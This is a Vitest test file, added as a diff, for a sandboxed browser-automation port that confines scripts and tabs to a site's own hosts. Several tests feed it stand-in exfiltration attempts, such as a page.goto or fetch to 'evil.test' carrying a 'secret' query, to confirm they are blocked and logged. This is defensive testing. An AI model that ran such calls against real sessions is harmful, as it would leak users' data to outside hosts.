@@ -1,0 +1,291 @@
+import { describe, expect, it, vi } from "vitest";
+import { FakeAsideRepl } from "../../../test/support/fake-aside-repl.js";
+import type { Logger } from "../../ports/logger.js";
+import type { SiteLease } from "../../ports/scheduler.js";
+import { AsideBrowserPort } from "./port.js";
+
+function spyLogger() {
+  const warn = vi.fn();
+  const logger: Logger = { debug: vi.fn(), info: vi.fn(), warn, error: vi.fn() };
+  return { logger, warn };
+}
+
+function setup(options: { warmTabTtlMs?: number } = {}) {
+  const repl = new FakeAsideRepl();
+  const { logger, warn } = spyLogger();
+  const port = new AsideBrowserPort({
+    repl,
+    logger,
+    warmTabTtlMs: options.warmTabTtlMs ?? 0,
+    stepTimeoutMs: 5000,
+  });
+  return { repl, port, warn };
+}
+
+const scope = { siteKey: "example", hostnames: ["example.com"] };
+
+describe("AsideBrowserPort", () => {
+  it("reports status through a probe call", async () => {
+    const { port } = setup();
+    await expect(port.status()).resolves.toEqual({ reachable: true, account: "u0" });
+  });
+
+  it("reports an unreachable REPL as not reachable with the outcome message", async () => {
+    const { port, repl } = setup();
+    await repl.close();
+    const s = await port.status();
+    expect(s).toMatchObject({ reachable: false, account: "u0" });
+    expect(s.message).toBeTruthy();
+  });
+
+  it("opens a bridge tab on the site, installs the filter first, and closes it on dispose", async () => {
+    const { port, repl } = setup();
+    const session = await port.openSession(scope);
+    const tab = await session.openTab("https://example.com/");
+    expect(tab.url).toBe("https://example.com/");
+    const page = repl.pages.get(tab.id)!;
+    expect(page.blockPatterns.length).toBeGreaterThan(0);
+    expect(page.initScripts).toHaveLength(2);
+    expect(page.navigations).toEqual(["https://example.com/"]);
+    await session.dispose();
+    expect(repl.pages.size).toBe(0);
+    expect(repl.closedTabs).toEqual([tab.id]);
+    expect(repl.userTab.navigations).toEqual([]);
+  });
+
+  it("rejects a cross-host openTab before reaching the REPL and logs the violation", async () => {
+    const { port, repl, warn } = setup();
+    const session = await port.openSession(scope);
+    await expect(session.openTab("https://evil.test/")).rejects.toMatchObject({ status: "adapter_error" });
+    expect(repl.calls).toHaveLength(0);
+    expect(warn).toHaveBeenCalledWith(
+      "browser shim violation",
+      expect.objectContaining({ site: "example", kind: "openTab" }),
+    );
+  });
+
+  it("rejects a cross-host cookie fetch and allows a same-host one without set-cookie", async () => {
+    const { port, repl } = setup();
+    repl.responses.set("https://example.com/api", {
+      status: 200,
+      headers: { "set-cookie": "a=b", "x-y": "1" },
+      body: "{}",
+    });
+    const session = await port.openSession(scope);
+    await expect(session.fetch("https://evil.test/api")).rejects.toMatchObject({ status: "adapter_error" });
+    const r = await session.fetch("https://example.com/api");
+    expect(r).toEqual({ status: 200, url: "https://example.com/api", headers: { "x-y": "1" }, text: "{}" });
+    expect(repl.fetchLog.map((f) => f.url)).toEqual(["https://example.com/api"]);
+  });
+
+  it("rejects a statically forbidden script with adapter_error, logs it, and never sends it", async () => {
+    const { port, repl, warn } = setup();
+    const session = await port.openSession(scope);
+    await expect(session.runScript("return Object.keys(fs);")).rejects.toMatchObject({
+      status: "adapter_error",
+      message: expect.stringContaining('forbidden identifier "fs"') as string,
+    });
+    expect(repl.calls).toHaveLength(0);
+    expect(warn).toHaveBeenCalledWith(
+      "browser shim violation",
+      expect.objectContaining({ kind: "forbidden-identifier", detail: "fs" }),
+    );
+  });
+
+  it("fails a runtime violation (cross-host goto) with adapter_error and logs only the host", async () => {
+    const { port, warn } = setup();
+    const session = await port.openSession(scope);
+    const tab = await session.openTab("https://example.com/");
+    await expect(
+      session.runScript(`try { await page.goto("https://evil.test/?q=secret"); } catch (e) {} return 1;`, {
+        tab,
+      }),
+    ).rejects.toMatchObject({
+      status: "adapter_error",
+      message: expect.stringContaining("evil.test") as string,
+    });
+    expect(warn).toHaveBeenCalledWith("browser shim violation", {
+      site: "example",
+      kind: "navigation",
+      detail: "evil.test",
+    });
+    expect(JSON.stringify(warn.mock.calls)).not.toContain("secret");
+  });
+
+  it("fails a step whose page.evaluate hit a blocked cross-host request, and logs it", async () => {
+    const { port, repl, warn } = setup();
+    const session = await port.openSession(scope);
+    const tab = await session.openTab("https://example.com/");
+    await expect(
+      session.runScript(
+        `return await page.evaluate(async () => { try { await fetch("https://evil.test/c?d=secret"); } catch (e) {} return 1; });`,
+        { tab },
+      ),
+    ).rejects.toMatchObject({
+      status: "adapter_error",
+      message: expect.stringContaining("request to evil.test") as string,
+    });
+    expect(warn).toHaveBeenCalledWith("browser shim violation", {
+      site: "example",
+      kind: "request",
+      detail: "evil.test",
+    });
+    expect(repl.pageRequests).toEqual([]);
+  });
+
+  it("does not fail a step for requests the site's own scripts made; logs them at debug", async () => {
+    const repl = new FakeAsideRepl();
+    const debug = vi.fn();
+    const port = new AsideBrowserPort({
+      repl,
+      logger: { debug, info: vi.fn(), warn: vi.fn(), error: vi.fn() },
+      warmTabTtlMs: 0,
+    });
+    const session = await port.openSession(scope);
+    const tab = await session.openTab("https://example.com/");
+    repl.pages.get(tab.id)!.guardStore.push({ kind: "request", host: "ads.test", attributed: false });
+    await expect(session.runScript("return 1;", { tab })).resolves.toBe(1);
+    expect(debug).toHaveBeenCalledWith("requests blocked by the tab filter", {
+      site: "example",
+      hosts: "ads.test",
+    });
+  });
+
+  it("closes popups left by a session when it is disposed, and logs off-site ones", async () => {
+    const { port, repl, warn } = setup();
+    const session = await port.openSession(scope);
+    const tab = await session.openTab("https://example.com/");
+    const popup = repl.spawnPopup("https://evil.test/late", { attach: true });
+    await session.dispose();
+    expect(repl.pages.has(popup.targetId)).toBe(false);
+    expect(warn).toHaveBeenCalledWith("browser shim violation", {
+      site: "example",
+      kind: "popup",
+      detail: "evil.test",
+    });
+    expect(repl.pages.has(tab.id)).toBe(false);
+  });
+
+  it("runs a script against the session's default tab and returns its JSON result", async () => {
+    const { port, repl } = setup();
+    repl.titles.set("https://example.com/", "Example Domain");
+    const session = await port.openSession(scope);
+    await session.openTab("https://example.com/");
+    const v = await session.runScript(
+      "return { title: await page.title(), n: args.n * 2, gmail: typeof gmail };",
+      { args: { n: 21 } },
+    );
+    expect(v).toEqual({ title: "Example Domain", n: 42, gmail: "undefined" });
+  });
+
+  it("shadows REPL globals it did not know about by retrying once", async () => {
+    const { port, repl } = setup();
+    const session = await port.openSession(scope);
+    // The vm context has builtins (e.g. Atomics, WebAssembly) outside the standard list.
+    await expect(session.runScript("return 7;")).resolves.toBe(7);
+    expect(repl.calls).toHaveLength(2);
+    await expect(session.runScript("return 8;")).resolves.toBe(8);
+    expect(repl.calls).toHaveLength(3);
+  });
+
+  it("takes a snapshot and a screenshot of an owned tab only", async () => {
+    const { port, repl } = setup();
+    repl.titles.set("https://example.com/", "Example Domain");
+    const session = await port.openSession(scope);
+    const tab = await session.openTab("https://example.com/");
+    await expect(session.snapshot(tab)).resolves.toContain('title: "Example Domain"');
+    await expect(session.snapshot(tab, { maxChars: 5 })).resolves.toHaveLength(5);
+    await expect(session.screenshot(tab)).resolves.toEqual({ mimeType: "image/png", base64: "iVBORw0KGgo=" });
+    await expect(session.snapshot({ id: "USER-TAB", url: "" })).rejects.toMatchObject({
+      status: "adapter_error",
+    });
+    await expect(session.closeTab({ id: "USER-TAB", url: "" })).rejects.toMatchObject({
+      status: "adapter_error",
+    });
+    expect(repl.userTab.navigations).toEqual([]);
+  });
+
+  it("treats tabs from before a REPL restart as gone", async () => {
+    const { port, repl } = setup();
+    const session = await port.openSession(scope);
+    const tab = await session.openTab("https://example.com/");
+    repl.restart();
+    await expect(session.snapshot(tab)).rejects.toMatchObject({ status: "browser_unavailable" });
+    await session.dispose(); // must not try to close tabs of the old generation
+    expect(repl.closedTabs).toEqual([]);
+  });
+
+  it("keeps the last tab warm for the next session of the same site, then closes it after the TTL", async () => {
+    const { port, repl } = setup({ warmTabTtlMs: 80 });
+    const s1 = await port.openSession(scope);
+    const t1 = await s1.openTab("https://example.com/a");
+    await s1.dispose();
+    expect(repl.pages.has(t1.id)).toBe(true);
+
+    const s2 = await port.openSession(scope);
+    const t2 = await s2.openTab("https://example.com/b");
+    expect(t2.id).toBe(t1.id); // reused, no new tab
+    expect(repl.pages.size).toBe(1);
+    await s2.dispose();
+
+    const other = await port.openSession({ siteKey: "other", hostnames: ["other.test"] });
+    const t3 = await other.openTab("https://other.test/");
+    expect(t3.id).not.toBe(t1.id); // a warm tab is never shared across sites
+    await other.dispose();
+
+    await new Promise((r) => setTimeout(r, 200));
+    expect(repl.pages.size).toBe(0);
+    await port.shutdown();
+  });
+
+  it("closes every bridge tab on shutdown", async () => {
+    const { port, repl } = setup({ warmTabTtlMs: 60_000 });
+    const s1 = await port.openSession(scope);
+    await s1.openTab("https://example.com/a");
+    await s1.openTab("https://example.com/b");
+    await s1.dispose(); // one warm, one closed
+    const s2 = await port.openSession({ siteKey: "x", hostnames: ["x.test"] });
+    await s2.openTab("https://x.test/");
+    await port.shutdown();
+    expect(repl.pages.size).toBe(0);
+    expect(repl.closed).toBe(true);
+  });
+
+  it("honors the lease's politeness interval for tab opens and in-script navigations", async () => {
+    const { port } = setup();
+    const before = vi.fn(async () => undefined);
+    const record = vi.fn();
+    const lease: SiteLease = {
+      site: "example",
+      signal: new AbortController().signal,
+      minIntervalMs: 100,
+      beforePageLoad: before,
+      nextPageLoadAt: () => Date.now() + 100,
+      recordPageLoad: record,
+    };
+    const session = await port.openSession({ ...scope, lease });
+    await session.openTab("https://example.com/");
+    expect(before).toHaveBeenCalledOnce();
+    const start = Date.now();
+    await session.runScript(`await page.goto("https://example.com/2"); return 1;`);
+    expect(Date.now() - start).toBeGreaterThanOrEqual(95);
+    expect(record).toHaveBeenCalledOnce();
+    await session.dispose();
+  });
+
+  it("refuses work after the scope's signal aborted", async () => {
+    const { port, repl } = setup();
+    const ac = new AbortController();
+    const session = await port.openSession({ ...scope, signal: ac.signal });
+    ac.abort();
+    await expect(session.runScript("return 1;")).rejects.toMatchObject({ status: "timeout" });
+    expect(repl.calls).toHaveLength(0);
+  });
+
+  it("rejects an invalid scope", async () => {
+    const { port } = setup();
+    await expect(port.openSession({ siteKey: "x", hostnames: [] })).rejects.toMatchObject({
+      status: "adapter_error",
+    });
+  });
+});
